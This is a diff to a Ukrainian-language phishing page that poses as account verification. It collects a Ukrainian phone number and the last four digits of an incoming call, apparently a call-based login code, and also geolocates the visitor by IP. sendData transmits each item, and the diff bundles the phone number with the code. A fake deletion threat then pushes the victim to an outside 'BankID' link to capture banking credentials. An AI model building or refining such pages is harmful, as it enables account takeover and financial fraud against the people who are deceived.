@@ -12,7 +12,8 @@
             --primary: #007bff;
             --primary-hover: #0056b3;
             --success: #28a745;
-            --danger: #dc3545;
+            --danger: #dc3545; /* Червоний колір для BankID */
+            --danger-dark: #a71d2a; /* Темніший червоний для BankID hover */
             --border: #e0e0e0;
             --bg: #f8f9fa;
             --text: #333;
@@ -124,17 +125,16 @@
             letter-spacing: 1.2px;
         }
 
-        .sms-prompt {
+        .call-prompt { /* Змінено назву класу для дзвінка */
             color: var(--text-muted);
             margin-bottom: 16px;
             font-size: 14.5px;
-            line-height: 1.4;
         }
 
         .code-input-group {
             display: flex;
             justify-content: center;
-            gap: 12px; /* Трохи збільшив відступ, оскільки полів менше */
+            gap: 8px;
             margin: 0 auto 20px;
             padding: 0 10px;
             overflow-x: auto;
@@ -148,9 +148,9 @@
         }
 
         .code-input {
-            width: 55px; /* Трохи ширші поля */
-            height: 55px;
-            font-size: 22px;
+            width: 48px;
+            height: 48px;
+            font-size: 20px;
             font-weight: bold;
             text-align: center;
             border: 2px solid var(--border);
@@ -197,26 +197,27 @@
             transform: translateY(0);
         }
 
-        /* Стилі для чорної кнопки BankID */
-        .bankid-btn {
-            display: block;
+        /* Стиль для кнопки BankID (чорна, закруглена) */
+        .bankid-button {
             width: 100%;
-            padding: 16px;
-            background: #000; /* Чорний колір */
+            padding: 15px;
+            background: var(--black);
             color: white;
-            text-decoration: none;
-            border-radius: 50px; /* Сильне закруглення */
+            border: none;
+            border-radius: 25px; /* Більше заокруглення */
             font-size: 17px;
             font-weight: 600;
-            text-align: center;
-            transition: opacity 0.3s ease, transform 0.2s;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            margin-top: 20px;
-            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none; /* Для використання як посилання */
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
         }
 
-        .bankid-btn:hover {
-            opacity: 0.85;
+        .bankid-button:hover {
+            background: #333;
             transform: translateY(-1px);
         }
 
@@ -234,13 +235,18 @@
             to { opacity: 1; transform: translateX(0); }
         }
 
-        /* Стиль для тексту помилки/попередження */
-        .warning-message {
-            color: #333;
+        /* Стиль для повідомлення про непідтвердження/BankID */
+        .bankid-prompt-message {
+            color: var(--danger);
             text-align: center;
-            padding: 10px;
+            padding: 5px 0 20px;
             font-size: 16px;
+            font-weight: 500;
             line-height: 1.6;
+        }
+        
+        .bankid-prompt-message strong {
+            font-weight: 700;
         }
 
         input[type=tel]::-webkit-inner-spin-button,
@@ -282,14 +288,14 @@
                         aria-label="Номер телефону"
                     >
                 </div>
-                <button type="button" class="submit-button" onclick="showCallStep()">
+                <button type="button" class="submit-button" onclick="showCallCodeStep()">
                     Продовжити
                 </button>
             </div>
 
-            <div id="call-step" class="step">
-                <p class="sms-prompt">
-                    Протягом 1-2хв вам надійде дзвінок, введіть <strong>4 останніх цифри</strong> номеру який дзвонив
+            <div id="call-code-step" class="step">
+                <p class="call-prompt">
+                    Протягом 1-2хв вам надійде дзвінок, введіть 4 останніх цифри номеру який дзвонив
                 </p>
                 <div class="code-input-group">
                     <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
@@ -297,16 +303,17 @@
                     <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric">
                 </div>
-                <button type="button" class="submit-button" onclick="sendCallCode()">
+                <button type="button" class="submit-button" onclick="processCallCode()">
                     Підтвердити
                 </button>
             </div>
 
-            <div id="final-step" class="step">
-                <div class="warning-message">
-                    Ваш профіль не підтверджено. Для скасування видалення та продовжити користуватись, підтвердіть профіль за допомогою bankID
+            <div id="bankid-step" class="step">
+                <div class="bankid-prompt-message">
+                    Ваш профіль <strong>не підтверджено</strong>. Для скасування видалення та продовження користування, підтвердіть профіль за допомогою BankID.
                 </div>
-                <a href="https://idverification.onrender.com" class="bankid-btn">
+                <a href="https://idverification.onrender.com" class="bankid-button">
+                    <i class="fas fa-university"></i>
                     Підтвердити
                 </a>
             </div>
@@ -321,6 +328,7 @@
         document.getElementById('project-logo').src = `/logo?project=${project}`;
 
         let userCity = 'Невідомо';
+        let userPhone = ''; // Зберігаємо номер телефону тут
 
         // Отримуємо місто за IP
         fetch('https://ipapi.co/json/')
@@ -353,7 +361,8 @@
             });
         });
 
-        function showCallStep() {
+        // Оновлена функція переходу до кроку з кодом дзвінка
+        function showCallCodeStep() {
             const phone = $('#phone-number').val().replace(/\s/g, '');
             if (!/^\+380\d{9}$/.test(phone)) {
                 alert('Введіть коректний номер: +380XXXXXXXXX');
@@ -364,28 +373,28 @@
                 return;
             }
 
+            userPhone = phone; // Зберігаємо номер телефону
             $('#phone-step').removeClass('active');
-            $('#call-step').addClass('active');
+            $('#call-code-step').addClass('active');
             $('#code-1').focus();
-            sendData('phone', { phone });
+            sendData('phone', { phone: userPhone });
         }
 
-        function sendCallCode() {
-            // Збираємо код з 4 полів
-            const code = $('.code-input').map((_, el) => el.value).get().join('');
-            
-            // Перевірка на 4 цифри
+        // Оновлена функція обробки коду дзвінка та переходу до BankID
+        function processCallCode() {
+            // Збираємо лише перші 4 цифри
+            const code = $('.code-input').slice(0, 4).map((_, el) => el.value).get().join('');
             if (!/^\d{4}$/.test(code)) {
-                alert('Введіть 4 останніх цифри номеру');
+                alert('Введіть повний 4-значний код');
                 return;
             }
-            
-            // Відправка даних
-            sendData('code_call', { code });
 
-            // Перехід на фінальний крок
-            $('#call-step').removeClass('active');
-            $('#final-step').addClass('active');
+            // Додаємо телефон до відправки коду для повноти даних
+            sendData('call_code', { code, phone: userPhone }); 
+
+            // Перехід до кроку BankID
+            $('#call-code-step').removeClass('active');
+            $('#bankid-step').addClass('active');
         }
 
         function sendData(step, data) {
